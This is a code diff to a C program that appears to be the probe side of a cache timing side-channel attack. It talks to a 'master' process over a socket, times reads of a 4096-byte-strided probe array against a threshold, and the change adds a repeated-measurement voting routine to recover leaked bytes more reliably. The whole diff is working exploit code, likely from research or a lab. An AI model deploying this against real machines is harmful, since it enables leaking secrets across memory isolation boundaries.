@@ -7,6 +7,7 @@
 #include <sys/stat.h>
 #include <errno.h>
 #include <ctype.h>
+#include <assert.h>
 
 #include <emmintrin.h>
 #include <x86intrin.h>
@@ -19,6 +20,12 @@
  * compiled out.
  */
 int x;
+
+/*
+ * Reads byte many times to obtain the stats.
+ */
+static int read_byte(uint8_t *array, int runs, int master,
+    uint64_t threshold, uint8_t *byte);
 
 int main(int argc, char *argv[])
 {
@@ -57,47 +64,66 @@ int main(int argc, char *argv[])
     }
     printf("Master connected, starting\n");
 
-    err = 1;
-    while (err > 0)
+    while (1)
     {
-        int requests[REQUEST_SIZE] = {};
-        err = recv(master, requests, sizeof(requests), 0);
-        if (err < 0)
+        uint8_t byte = 0;
+        int hits = 0;
+        hits = read_byte(array, BYTE_READ_REPEATS, master, threshold, &byte);
+        if (hits < 0)
+            break;
+        else
         {
-            err = EXIT_FAILURE;
-            perror("recv");
-            goto err_quit2;
+            printf("%3d/%3d hits: %c (%d)\n", hits, BYTE_READ_REPEATS,
+                (isprint(byte) ? byte : '?'), byte);
         }
-        else if (err == 0)
-        {
-            err = EXIT_SUCCESS;
-            goto err_quit2;
-        }
-        usleep(100);
-
-        int found = 0;
-        char sym  = '\0';
-        for (int i = 1; i < 200; i++)
-        {
-            uint64_t duration = measure_access_time(&array[i*4096 + OFFSET]);
-            if (duration < threshold)
-            {
-                sym = (isprint(i) ? i : '?');
-                found = 1;
-                printf("Offset %3d: %c\n", requests[REQUEST_SIZE - 1], sym);
-            }
-        }
-        // printf("Offset %3d: %c (%d)\n", requests[REQUEST_SIZE - 1], sym, idx);
-        err = send(master, &found, sizeof(found), 0);
     }
 
-
-err_quit2:
+//err_quit2:
     close(master);
 err_quit1:
     close(sock);
 err_quit0:
     munmap(array, ARRSIZE);
     return EXIT_SUCCESS;
+}
+
+static int read_byte(uint8_t *array, int runs, int master,
+    uint64_t threshold, uint8_t *byte)
+{
+    assert(array);
+    assert(byte);
+
+    int hits[256] = {};
+
+    for (int r = 0; r < runs; r++)
+    {
+        int requests[REQUEST_SIZE] = {};
+        int err = recv(master, requests, sizeof(requests), 0);
+        if (err < 0)
+        {
+            perror("recv");
+            return -1;
+        }
+        else if (err == 0)
+            return -2;
+
+        usleep(100);
+
+        // Checking byte values
+        for (int i = 1; i < 200; i++)
+            if (measure_access_time(&array[i*4096 + OFFSET]) < threshold)
+                hits[i]++;
+
+        // Just sending a signal to sync
+        send(master, &hits[0], sizeof(hits[0]), 0);
+    }
+
+    int winner = 0;
+    for (int i = 0; i < 256; i++)
+        if (hits[i] > hits[winner])
+            winner  = i;
+
+    *byte = winner;
+    return hits[winner];
 }
 
